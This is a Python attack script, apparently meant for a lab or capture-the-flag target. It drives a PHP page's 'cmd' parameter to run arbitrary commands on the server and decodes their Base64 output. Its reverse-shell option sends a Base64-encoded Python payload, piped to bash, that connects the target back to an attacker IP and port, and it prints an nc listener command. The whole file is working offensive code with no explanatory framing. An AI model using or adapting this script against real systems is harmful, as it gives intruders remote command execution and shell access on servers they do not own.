import requests
import base64
import urllib.parse

# Target URL
TARGET_URL = "http://$Remote-Server/assets/index.php"

# Attacker IP & Port (change this to your IP)
ATTACKER_IP = "$IP"
ATTACKER_PORT = $PORT

def send_command(cmd):
    """ Sends a command to the vulnerable PHP page and decodes the Base64 response """
    encoded_cmd = urllib.parse.quote(cmd)  # URL-encode the command
    full_url = f"{TARGET_URL}?cmd={encoded_cmd}"

    response = requests.get(full_url)

    if response.status_code == 200 and response.text.strip():
        try:
            decoded_output = base64.b64decode(response.text.strip()).decode("utf-8")
            print(f"\n[+] Command Output:\n{decoded_output}\n")
        except:
            print("\n[-] Could not decode Base64 output\n")
    else:
        print("\n[-] No response or error\n")

def get_reverse_shell():
    """ Sends a reverse shell payload to the target """
    print("[*] Launching Reverse Shell...")

    reverse_shell_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ATTACKER_IP}\",{ATTACKER_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    encoded_shell = base64.b64encode(reverse_shell_cmd.encode()).decode()

    shell_payload = f"echo {encoded_shell} | base64 -d | bash"
    send_command(shell_payload)
    print(f"[*] Start your listener: nc -lvnp {ATTACKER_PORT}")

def interactive_shell():
    """ Interactive command execution """
    print("[*] Enter commands (type 'exit' to quit)")
    while True:
        cmd = input("SHELL> ")
        if cmd.lower() in ["exit", "quit"]:
            break
        send_command(cmd)

if __name__ == "__main__":
    print("[1] Interactive Shell")
    print("[2] Get Reverse Shell")
    
    choice = input("Choose an option: ")
    
    if choice == "1":
        interactive_shell()
    elif choice == "2":
        get_reverse_shell()
    else:
        print("[-] Invalid choice. Exiting.")
